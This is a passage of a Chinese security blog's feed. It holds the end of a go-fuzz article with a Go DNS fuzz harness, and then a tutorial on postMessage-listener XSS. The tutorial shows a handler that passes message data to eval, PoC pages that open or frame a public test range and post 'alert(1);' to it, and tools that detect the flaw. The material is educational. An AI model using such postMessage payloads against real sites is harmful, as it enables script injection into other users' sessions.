<span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErr<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"dns: bad rdlength"</span> <span class="token punctuation">{</span>        <span class="token comment">// 3157620 - unpackStructValue: drop rdlen, reslice msg instead</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErr<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"dns: bad address family"</span> <span class="token punctuation">{</span>        <span class="token comment">// f37c7ea - Reject a bad EDNS0_SUBNET family on unpack (not only on pack)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErr<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"dns: bad netmask"</span> <span class="token punctuation">{</span>        <span class="token comment">// 6d5de0a - EDNS0_SUBNET: refactor netmask handling</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> unpackErrOld <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"new code fails to unpack valid packets"</span><span class="token punctuation">)</span>        <span class="token function">panic</span><span class="token punctuation">(</span>unpackErr<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">,</span> packErr <span class="token operator">=</span> msg<span class="token punctuation">.</span><span class="token function">PackBuffer</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span>    <span class="token keyword">if</span> packErr <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"failed to pack back a message"</span><span class="token punctuation">)</span>        spew<span class="token punctuation">.</span><span class="token function">Dump</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token function">panic</span><span class="token punctuation">(</span>packErr<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> unpackErrOld <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        resOld<span class="token punctuation">,</span> packErrOld <span class="token operator">=</span> msgOld<span class="token punctuation">.</span><span class="token function">PackBuffer</span><span class="token punctuation">(</span>bufOld<span class="token punctuation">)</span>        <span class="token keyword">if</span> packErrOld <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>bytes<span class="token punctuation">.</span><span class="token function">Equal</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> resOld<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"new code changed behavior of valid packets:"</span><span class="token punctuation">)</span>            <span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">println</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">Dump</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">println</span><span class="token punctuation">(</span>hex<span class="token punctuation">.</span><span class="token function">Dump</span><span class="token punctuation">(</span>resOld<span class="token punctuation">)</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Tips：</p><p>​        其实在Fuzz过程中也会遇到一些结构化的问题，毕竟大型项目都会存在大量的复杂结构体难以变异，这时候才为大家提供一个神器go-fuzz-header：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types">https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types</a></p></blockquote><h2 id="云原生下的Fuzz思考"><a href="#云原生下的Fuzz思考" class="headerlink" title="云原生下的Fuzz思考"></a>云原生下的Fuzz思考</h2><p>​        云原生的很多新技术其实都是在老技术的交叉上形成的，其实可以类似go项目结构里面的不同的包，对于很多Fuzz目标来言，像以前那样直接从最根本处下手已经不太现实可行，比如容器Fuzz其实很难通过生成大量镜像或者docker client的命令来解决，恰恰相反深入程序内部针对不同函数来编写Fuzz或许更有价值。</p><p>​        但是缺点也很明显，首先必须和代码审计相结合，其次就是由于代码是否用户可达或者crash是否真的引发漏洞效果都有待评估，正如go-fuzz创始人所说：“go-fuzz其实更适合开发者来寻求自己项目中存在的bug”，但是漏洞挖掘技术也是在不断的进步之中，或许可以思考如何把找到的bug发展成漏洞，毕竟对于内存安全的高级语言来说直接谋求可利用漏洞相对困难。</p><p>​        其实在内存漏洞越来越少的现在，这种bug最终演变成漏洞的例子还是有的，就比如linux pkexec提权漏洞，过去几年大家都认为这是一个bug，但是等利用方式被真正发掘，就能变化成为严重的安全问题。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/dvyukov/go-fuzz">https://github.com/dvyukov/go-fuzz</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Go-fuzz的解析与思考&quot;&gt;&lt;a href=&quot;#Go-fuzz的解析与思考&quot; class=&quot;headerlink&quot; title=&quot;Go-fuzz的解析与思考&quot;&gt;&lt;/a&gt;Go-fuzz的解析与思考&lt;/h1&gt;&lt;h2 id=&quot;go-fuzz&quot;&gt;&lt;a href=&quot;#go</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>EventListener XSS</title>
    <link href="https://rainsec.cn/post/EventListener%20XSS.html"/>
    <id>https://rainsec.cn/post/EventListener%20XSS.html</id>
    <published>2022-03-25T10:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.343Z</updated>
    
    <content type="html"><![CDATA[<p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p><h2 id="事件监听器"><a href="#事件监听器" class="headerlink" title="事件监听器"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;table id="outside"&gt;    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;script&gt;function modifyText() {  var t2 = document.getElementById("t2");  if (t2.firstChild.nodeValue == "three") {    t2.firstChild.nodeValue = "two";  } else {    t2.firstChild.nodeValue = "three";  }}// 为table添加事件监听器var el = document.getElementById("outside");el.addEventListener("click", modifyText, false);&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/Events#event_index">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p><p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p><p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><p>它的用法也很简单：</p><pre class="line-numbers language-none"><code class="language-none">windows.postMessage(message, targetOrigin, [transfer])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p></li><li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p></li><li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p></li></ul><p>发送消息事件可以通过如下方式添加监听事件：</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">window.addEventListener("message", receiveMessage, false);function receiveMessage(event){}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p><ul><li><p>data 即<code>postMessage</code>发送的数据</p></li><li><p>origin 发送信息窗口的<code>origin</code></p></li></ul><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;html&gt;  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var postMessageHandler = function(msg) {  var content = msg.data;  var msgObj = eval(content);  if (msgObj.isActive) {    document.write("PostMessage arrived!");  }}window.addEventListener('message', postMessageHandler, false);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;script&gt;                    function pocLink() {                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');                        let msg = "alert(1);";                        setTimeout(function(){                            win.postMessage(msg, '*');                        }, 5000);                    }&lt;/script&gt; &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者是使用<code>iframe</code></p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;script&gt;  function pocFrame(win) {               let msg = "alert(1);";    win.postMessage(msg, '*');            }&lt;/script&gt; &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p><h2 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png" alt="img"></p><p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png" alt="img"></p><p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a href="https://github.com/fransr/postMessage-tracker">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png" alt="img"></p><p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p><p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png" alt="img"></p><p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png" alt="img"></p><p>这一段的主要作用就是在添加监听器前判断其类型是否时<code>message</code>，如果是则记录下来一些数据，比如此时的堆栈信息等。合理推测<code>Burp</code>在此之上加入了危险函数判断的操作，后续有空的话就给<code>DOM Invader</code>加一个类似的功能练练手吧，日常使用当然还是<code>Burp</code>的香啊~</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><p><a href="https://github.com/fransr/postMessage-tracker">https://github.com/fransr/postMessage-tracker</a></p></li><li><p><a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader">https://portswigger.net/burp/documentation/desktop/tools/dom-invader</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;EventListener XSS&lt;/strong&gt;&lt;br&gt;XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是&lt;code&gt;DOM&lt;/code&gt;型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听&lt;code&gt;postMessag</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://rainsec.cn/tags/XSS/"/>
    
  </entry>
  
</feed>
